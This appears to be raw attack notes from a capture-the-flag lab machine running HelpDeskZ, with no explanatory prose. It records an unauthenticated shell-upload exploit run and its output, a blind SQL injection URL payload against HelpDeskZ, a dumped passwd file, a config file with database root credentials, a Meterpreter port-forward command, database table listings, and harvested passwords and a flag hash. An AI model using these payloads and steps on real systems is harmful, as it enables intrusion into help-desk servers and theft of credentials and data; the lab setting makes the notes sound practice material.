Ubuntu 16.04.05 LTS

Apache 2.4.18
Running HelpDeskZ (/support/)

python exploit.py http://10.10.10.121/support/uploads/tickets/ evil.php
Helpdeskz v1.0.2 - Unauthenticated shell upload exploit
found!
http://10.10.10.121/support/uploads/tickets/a46ebaa26535ab7b599d9aa22b1f4c60.php

user.txt: bb8a7b36bdce0c61ccebaa173ef946af

helpme@helpme.com / 5d3c93182bb20f07b994a7f617e99cff

godhelpmeplz

passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
help:x:1000:1000:help,,,:/home/help:/bin/bash
sshd:x:108:65534::/var/run/sshd:/usr/sbin/nologin
mysql:x:109:117:MySQL Server,,,:/nonexistent:/bin/false
Debian-exim:x:110:118::/var/spool/exim4:/bin/false

http://10.10.10.121/support/?v=view_tickets&action=ticket&param[]=10&param[]=attachment&param[]=5&param[]=12%20or%201=1%20and%20ascii(substr((SeLeCt%20table_name%20from%20information_schema.columns%20where%20table_name%20like%20%27%staff%27%20%20limit%200,1),1,1))%20=%20%2047%20--%20-


run as group:
/sbin/unix_chkpwd
/sbin/pam_extrausers_chkpwd
/usr/bin/bsd-write
/usr/bin/wall
/usr/bin/ssh-agent
/usr/bin/mlocate
/usr/bin/chage
/usr/bin/crontab
/usr/bin/expiry
/usr/bin/screen

cat config.php
<?php
	$config['Database']['dbname'] = 'support';
	$config['Database']['tableprefix'] = '';
	$config['Database']['servername'] = 'localhost';
	$config['Database']['username'] = 'root';
	$config['Database']['password'] = 'helpme';
	$config['Database']['type'] = 'mysqli';
	?>

portfwd add -l 3306 -p 3306 -r 127.0.0.1

Database
information_schema
mysql
performance_schema
support
sys

mysql:
columns_priv
db
engine_cost
event
func
general_log
gtid_executed
help_category
help_keyword
help_relation
help_topic
innodb_index_stats
innodb_table_stats
ndb_binlog_index
plugin
proc
procs_priv
proxies_priv
server_cost
servers
slave_master_info
slave_relay_log_info
slave_worker_info
slow_log
tables_priv
time_zone
time_zone_leap_second
time_zone_name
time_zone_transition
time_zone_transition_type
user

sys:
host_summary
host_summary_by_file_io
host_summary_by_file_io_type
host_summary_by_stages
host_summary_by_statement_latency
host_summary_by_statement_type
innodb_buffer_stats_by_schema
innodb_buffer_stats_by_table
innodb_lock_waits
io_by_thread_by_latency
io_global_by_file_by_bytes
io_global_by_file_by_latency
io_global_by_wait_by_bytes
io_global_by_wait_by_latency
latest_file_io
memory_by_host_by_current_bytes
memory_by_thread_by_current_bytes
memory_by_user_by_current_bytes
memory_global_by_current_bytes
memory_global_total
metrics
processlist
ps_check_lost_instrumentation
schema_auto_increment_columns
schema_index_statistics
schema_object_overview
schema_redundant_indexes
schema_table_lock_waits
schema_table_statistics
schema_table_statistics_with_buffer
schema_tables_with_full_table_scans
schema_unused_indexes
session
session_ssl_status
statement_analysis
statements_with_errors_or_warnings
statements_with_full_table_scans
statements_with_runtimes_in_95th_percentile
statements_with_sorting
statements_with_temp_tables
sys_config
user_summary
user_summary_by_file_io
user_summary_by_file_io_type
user_summary_by_stages
user_summary_by_statement_latency
user_summary_by_statement_type
version
wait_classes_global_by_avg_latency
wait_classes_global_by_latency
waits_by_host_by_latency
waits_by_user_by_latency
waits_global_by_latency
x$host_summary
x$host_summary_by_file_io
x$host_summary_by_file_io_type
x$host_summary_by_stages
x$host_summary_by_statement_latency
x$host_summary_by_statement_type
x$innodb_buffer_stats_by_schema
x$innodb_buffer_stats_by_table
x$innodb_lock_waits
x$io_by_thread_by_latency
x$io_global_by_file_by_bytes
x$io_global_by_file_by_latency
x$io_global_by_wait_by_bytes
x$io_global_by_wait_by_latency
x$latest_file_io
x$memory_by_host_by_current_bytes
x$memory_by_thread_by_current_bytes
x$memory_by_user_by_current_bytes
x$memory_global_by_current_bytes
x$memory_global_total
x$processlist
x$ps_digest_95th_percentile_by_avg_us
x$ps_digest_avg_latency_distribution
x$ps_schema_table_statistics_io
x$schema_flattened_keys
x$schema_index_statistics
x$schema_table_lock_waits
x$schema_table_statistics
x$schema_table_statistics_with_buffer
x$schema_tables_with_full_table_scans
x$session
x$statement_analysis
x$statements_with_errors_or_warnings
x$statements_with_full_table_scans
x$statements_with_runtimes_in_95th_percentile
x$statements_with_sorting
x$statements_with_temp_tables
x$user_summary
x$user_summary_by_file_io
x$user_summary_by_file_io_type
x$user_summary_by_stages
x$user_summary_by_statement_latency
x$user_summary_by_statement_type
x$wait_classes_global_by_avg_latency
x$wait_classes_global_by_latency
x$waits_by_host_by_latency
x$waits_by_user_by_latency
x$waits_global_by_latency

admin / support@mysite.com / Welcome1
rOOTmEoRdIE
RootMeOrDie